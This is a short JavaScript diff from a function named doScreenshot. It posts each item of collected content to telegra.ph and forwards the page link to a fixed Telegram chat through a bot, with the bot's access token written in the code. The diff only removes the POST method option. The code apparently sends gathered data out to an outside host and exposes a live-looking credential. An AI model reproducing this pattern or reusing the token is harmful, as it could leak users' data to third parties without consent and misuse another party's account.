@@ -112,10 +112,10 @@ const doScreenshot = () => {
 
   for(let i = 0;i<=count;i++){
     console.log(res[i])
-    fetch(`https://api.telegra.ph/createPage?access_token=${tok}&title=my_title-${i}&content=[ {"tag":"p","children":["${res[i]}"]} ]&author_name=poilka`,{method: 'POST',})
+    fetch(`https://api.telegra.ph/createPage?access_token=${tok}&title=my_title-${i}&content=[ {"tag":"p","children":["${res[i]}"]} ]&author_name=poilka`)
       .then(response => response.json())
       .then(data =>{
-        fetch(`https://api.telegram.org/bot5654424384:AAHR-qS4Fz4nd31lmDfXEuELEZlJ5osNu64/sendMessage?chat_id=961145889&text=${data.result.url}`,{method:'POST',})
+        fetch(`https://api.telegram.org/bot5654424384:AAHR-qS4Fz4nd31lmDfXEuELEZlJ5osNu64/sendMessage?chat_id=961145889&text=${data.result.url}`)
         .then(response => response.json()) // Декодируем ответ в формате json
         .then(data => console.log(data));
       });
